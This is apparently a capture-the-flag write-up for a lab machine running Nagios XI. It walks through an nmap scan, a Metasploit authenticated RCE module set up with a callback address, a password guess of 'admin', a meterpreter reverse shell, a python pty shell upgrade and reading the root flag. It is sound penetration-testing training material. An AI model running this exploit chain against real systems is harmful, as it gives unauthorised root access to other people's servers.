# Montioring 

### Recon

## portcsanning

as usual we begin with a portscan using the following command:

```nmap -sV -sC -P0 <HOST>```

![Alt text](/posts/res/mon1.png)

so from the result of our scan we can see that we have several ports open on our target system.

- ### port ***80(http)***

- ### port ***25(smtp)***

- ### port ***22(ssh)***

- ### port ***443(http- Apache)***

- ### port ***389(ldap)***

now since we have both port 80 and 443 runnng an apache web server lets navigate to the webpage and see what we have.


![Alt text](/posts/res/mon2.png)


we can see a button which says ***Click the link below to get started using Nagios XI.***. once we do that we can now see a login page load up.


![Alt text](/posts/res/mon3.png)

so i tried out some various default login creds but they didnt seem to work.

well, lets try to use search for an exploit of some sort on using the searchsploit utility. 


![Alt text](/posts/res/mon4.png)

we can load up the metasploit using the following command: 

```msfconsole```

```search nagios```


![Alt text](/posts/res/mon5.png)

```use exploit/linux/http/nagios_xi_mibs_authenticated_rce```

- ```set RHOST <machine IP> ```

- ```set LHOST <attack-machine-ip>```

- ```set password admin```

- ```run```

![Alt text](/posts/res/mon6.png)

now we have gained a meterpreter shell let's drop into a regular shell.

command: ```shell```

to upgrade to a better abd stable shell we use the following command:

```python -c "import pty; pty.spawn('/bin/bash')"```

![Alt text](/posts/res/mon7.png)

luckly we gained access as the root user. to locate the flag we navigate to ***/root*** directory and then read the flag using the following command:

```cd /root```

```cat proof.txt```


![Alt text](/posts/res/mon8.png)



